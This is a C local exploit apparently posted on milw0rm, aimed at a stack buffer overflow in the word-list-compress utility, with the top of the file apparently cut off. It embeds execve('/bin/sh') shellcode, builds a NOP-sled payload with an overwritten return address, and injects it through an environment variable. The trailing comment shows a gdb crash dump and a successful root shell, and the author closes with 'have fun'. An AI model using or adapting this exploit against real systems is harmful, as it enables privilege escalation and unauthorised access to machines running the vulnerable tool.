unsigned long get_sp(void)
{
        __asm__("movl %esp, %eax");
}
int main()
{
char shellcode[] = /* 37 bytes shellcode written by myself */
"\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c"
"\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff"
"\xff/bin/sh";
char exploit[size] ;
char *ptr;
long *addr_ptr;
char test[300];
long addr;
int NL= 180 ;

int i ;
int x=0 ;
ptr = exploit;
addr_ptr = (long *) ptr;

for(i=0;i < size;i+=4){
*(addr_ptr++) = address;
}
for(i=0 ; i < NL ; i++ )
{
exploit[i] = NOP;
}
if(shellcode != NULL){
while(x != strlen(shellcode)){
exploit[NL] = shellcode[x];
NL+=1;x+=1;
}

        }
exploit[size] = 0x00;

printf("word-list-compress local exploit by root / c0d3r\n");
printf("stack pointer: 0x%x\n", get_sp());
printf("using return address : 0x%x\n", address);
printf("using %d bytes shellcode\n", sizeof(shellcode));
setenv("exploit", exploit, 1);
putenv(exploit);
printf("exploit string loaded into the enviroment\n");
system("echo $exploit | word-list-compress c");
return 0;
}

/*

root@darkstar:/sploits# word-list-compress
Compresses or uncompresses sorted word lists.
For best result the locale should be set to C
before sorting by setting the environmental
variable LANG to "C" before sorting.
Copyright 2001 by Kevin Atkinson.
Usage: word-list-compress c[ompress]|d[ecompress]
root@darkstar:/sploits#

************************************************************

root@darkstar:/sploits# echo `perl -e 'print "A"x300'` |
word-list-compress c
Segmentation fault (core dumped)
root@darkstar:/sploits# gdb -c core
GNU gdb 6.1.1
Copyright 2004 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain
conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB. Type "show warranty" for details.
This GDB was configured as "i486-slackware-linux".
Core was generated by `word-list-compress c'.
Program terminated with signal 11, Segmentation fault.
#0 0x41414141 in ?? ()
(gdb) info registers
eax 0x0 0
ecx 0x40154c20 1075137568
edx 0x0 0
ebx 0x41414141 1094795585
esp 0xbffff560 0xbffff560
ebp 0x41414141 0x41414141
esi 0x41414141 1094795585
edi 0x41414141 1094795585
eip 0x41414141 0x41414141
eflags 0x210246 2163270
cs 0x23 35
ss 0x2b 43
ds 0x2b 43
es 0x2b 43
fs 0x2b 43
---Type <return> to continue, or q <return> to quit---

**********************************************************

root@darkstar:/sploits# gcc word-list-compress.c -o word-list-compress
word-list-compress.c:65:2: warning: no newline at end of file
root@darkstar:/sploits# ./word-list-compress
word-list-compress local exploit by root / c0d3r
stack pointer: 0xbffff268
using return address : 0xbffff2b8
using 37 bytes shellcode
exploit string loaded into the enviroment
 [1 C[C KS /bin/sh sh-2.05b# echo IHS
IHS
sh-2.05b#

************************************************************

thats all . have fun !
*/

// milw0rm.com [2004-12-01]
            
